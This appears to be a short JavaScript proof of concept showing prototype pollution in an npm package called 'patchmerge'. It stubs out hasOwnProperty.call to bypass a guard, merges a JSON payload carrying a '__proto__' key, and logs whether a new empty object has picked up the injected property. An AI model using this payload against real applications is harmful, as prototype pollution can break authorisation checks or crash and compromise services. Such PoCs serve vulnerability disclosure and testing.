Object.prototype.hasOwnProperty.call = () => true;
var patchMerge = require('patchmerge');
var obj = {};
console.log({}.polluted);
patchMerge(obj, JSON.parse('{"__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);